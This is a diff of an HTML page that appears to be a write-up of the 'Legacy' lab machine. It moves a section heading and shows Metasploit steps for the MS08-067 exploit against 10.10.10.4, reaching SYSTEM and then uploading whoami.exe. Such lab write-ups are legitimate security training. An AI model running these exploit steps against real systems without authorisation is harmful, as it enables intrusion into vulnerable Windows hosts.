@@ -70,6 +70,9 @@
         
         
         <img src="legacy/3.png" height=500 width=750 alt="legacy">
+    
+
+    <h2>3. Getting SYSTEM Access</h2>
         
     
     <p>I decided to go with the MS08-067 exploit and opened it up in metasploit:</p>
@@ -80,20 +83,14 @@
 
     Set RHOSTS 10.10.10.4
 
-    Run</b></pre>
-    
-
-<h2>3. Getting SYSTEM Access</h2>
-        
+    Run</b></pre>    
         
     <p>So now, I was running as SYSTEM but I couldn’t run various commands e.g whoami.
-So I decided to upload it from my local machine:</p>
-        
+So I decided to upload it from my local machine:</p>       
         
     <pre><b>si@kali:~$ locate whoami.exe
 
-    /usr/share/windows-resources/binaries/whoami.exe</b></pre>
-        
+    /usr/share/windows-resources/binaries/whoami.exe</b></pre>    
     
     <p>I ran the following command:</p>
         
